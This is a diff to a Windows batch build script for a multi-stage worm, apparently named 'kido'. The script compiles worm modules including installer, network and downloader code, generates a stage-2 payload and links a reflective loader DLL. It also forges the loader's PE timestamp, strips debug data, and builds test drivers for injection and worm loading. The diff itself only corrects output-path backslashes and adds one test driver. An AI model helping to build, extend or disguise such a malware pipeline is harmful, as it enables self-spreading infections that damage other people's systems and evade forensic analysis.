@@ -56,7 +56,7 @@ set CLFLAGS=/nologo /c /W3 /O2 /Oy- /GF /Gy /MD /DWIN32 /D_WINDOWS /DNDEBUG /D_C
 set LDFLAGS=/nologo /MACHINE:X86 /SUBSYSTEM:WINDOWS /OPT:REF /OPT:ICF /DEBUG:NONE
 
 echo == [1/5] compile worm (stage 3) ==
-cl %CLFLAGS% /Fobuild\obj\\ src\worm\crypto.cpp src\worm\kido_global.cpp src\worm\kido_guards.cpp ^
+cl %CLFLAGS% /Fobuild\obj\ src\worm\crypto.cpp src\worm\kido_global.cpp src\worm\kido_guards.cpp ^
   src\worm\kido_main.cpp src\worm\kido_install.cpp src\worm\kido_http.cpp ^
   src\worm\kido_net.cpp src\worm\kido_geo.cpp src\worm\kido_downloader.cpp
 if errorlevel 1 ( echo [ERROR] worm compile failed 1>&2 & exit /b 1 )
@@ -80,7 +80,7 @@ python tools\gen_stage2_payload.py build\kido_stage2.dll src\wrapper\stage2_payl
 if errorlevel 1 ( echo [ERROR] payload generation failed 1>&2 & exit /b 1 )
 
 echo == [4b/5] link stage 1 (reflective loader, base 0x10000000) ==
-cl %CLFLAGS% /Fobuild\obj\\ src\wrapper\loader.cpp
+cl %CLFLAGS% /Fobuild\obj\ src\wrapper\loader.cpp
 if errorlevel 1 ( echo [ERROR] stage1 compile failed 1>&2 & exit /b 1 )
 link.exe %LDFLAGS% /DLL /BASE:0x10000000 /OUT:build\kido_stage1.dll ^
   build\obj\loader.obj
@@ -88,27 +88,30 @@ if errorlevel 1 ( echo [ERROR] stage1 link failed 1>&2 & exit /b 1 )
 python tools\patch_timestamp.py build\kido_stage1.dll 0x39DF5AFB
 
 echo == [5/5] test drivers (console, x86) ==
-cl %CLFLAGS% /Isrc\worm /Isrc\wrapper /Fobuild\obj\\ src\test\test_crypto.cpp
+cl %CLFLAGS% /Isrc\worm /Isrc\wrapper /Fobuild\obj\ src\test\test_crypto.cpp
 if errorlevel 1 ( echo [ERROR] test_crypto compile failed 1>&2 & exit /b 1 )
 link.exe /nologo /MACHINE:X86 /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF /DEBUG:NONE ^
   /OUT:build\test_crypto.exe build\obj\test_crypto.obj build\obj\crypto.obj advapi32.lib
 if errorlevel 1 ( echo [ERROR] test_crypto link failed 1>&2 & exit /b 1 )
 
-cl %CLFLAGS% /Isrc\wrapper /Fobuild\obj\\ src\test\decode_test.cpp
+cl %CLFLAGS% /Isrc\wrapper /Fobuild\obj\ src\test\decode_test.cpp
 link.exe /nologo /MACHINE:X86 /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF /DEBUG:NONE ^
   /OUT:build\decode_test.exe build\obj\decode_test.obj advapi32.lib
-cl %CLFLAGS% /Fobuild\obj\\ src\test\load_test.cpp
+cl %CLFLAGS% /Fobuild\obj\ src\test\load_test.cpp
 link.exe /nologo /MACHINE:X86 /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF /DEBUG:NONE ^
   /OUT:build\load_test.exe build\obj\load_test.obj iphlpapi.lib ws2_32.lib
-cl %CLFLAGS% /Fobuild\obj\\ src\test\inject_test.cpp
+cl %CLFLAGS% /Fobuild\obj\ src\test\inject_test.cpp
 link.exe /nologo /MACHINE:X86 /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF /DEBUG:NONE ^
   /OUT:build\inject_test.exe build\obj\inject_test.obj iphlpapi.lib ws2_32.lib
-cl %CLFLAGS% /Fobuild\obj\\ src\test\inject2_test.cpp
+cl %CLFLAGS% /Fobuild\obj\ src\test\inject2_test.cpp
 link.exe /nologo /MACHINE:X86 /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF /DEBUG:NONE ^
   /OUT:build\inject2_test.exe build\obj\inject2_test.obj iphlpapi.lib ws2_32.lib
-cl %CLFLAGS% /Fobuild\obj\\ src\test\worm_load.cpp
+cl %CLFLAGS% /Fobuild\obj\ src\test\worm_load.cpp
 link.exe /nologo /MACHINE:X86 /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF /DEBUG:NONE ^
   /OUT:build\worm_load.exe build\obj\worm_load.obj iphlpapi.lib ws2_32.lib
+cl %CLFLAGS% /Fobuild\obj\ src\test\kido_get.cpp
+link.exe /nologo /MACHINE:X86 /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF /DEBUG:NONE ^
+  /OUT:build\kido_get.exe build\obj\kido_get.obj ws2_32.lib
 if errorlevel 1 ( echo [ERROR] test drivers failed 1>&2 & exit /b 1 )
 
 echo == strip PDB / debug info ==
